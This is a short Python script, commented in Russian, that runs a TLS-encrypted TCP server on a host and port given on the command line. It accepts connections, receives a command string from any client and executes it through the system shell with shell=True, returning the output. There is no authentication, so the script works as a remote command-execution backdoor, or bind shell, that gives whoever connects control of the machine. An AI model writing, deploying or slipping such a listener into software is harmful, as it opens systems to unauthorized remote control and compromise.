import socket
import ssl
import subprocess
import sys

host = sys.argv[1]
port = int(sys.argv[2])

# Создаем TCP сокет
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((host, port))
server_socket.listen(1)
print(f"Сервер запущен на {host}:{port}. Ожидание подключения...")

# Настройка TLS
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile='server_cert.pem', keyfile='server_key.pem')  # Замените на ваши файлы сертификата и ключа

while True:
    # Принимаем входящее соединение
    conn, addr = server_socket.accept()
    print(f"Подключено к {addr}")

    # Оборачиваем сокет с помощью SSL
    tls_conn = context.wrap_socket(conn, server_side=True)

    # Ожидаем команду от клиента
    command = tls_conn.recv(1024).decode('utf-8')

    # Выполняем команду и получаем результат
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        tls_conn.sendall(output)
    except subprocess.CalledProcessError as e:
        tls_conn.sendall(e.output)
    finally:
        tls_conn.close()
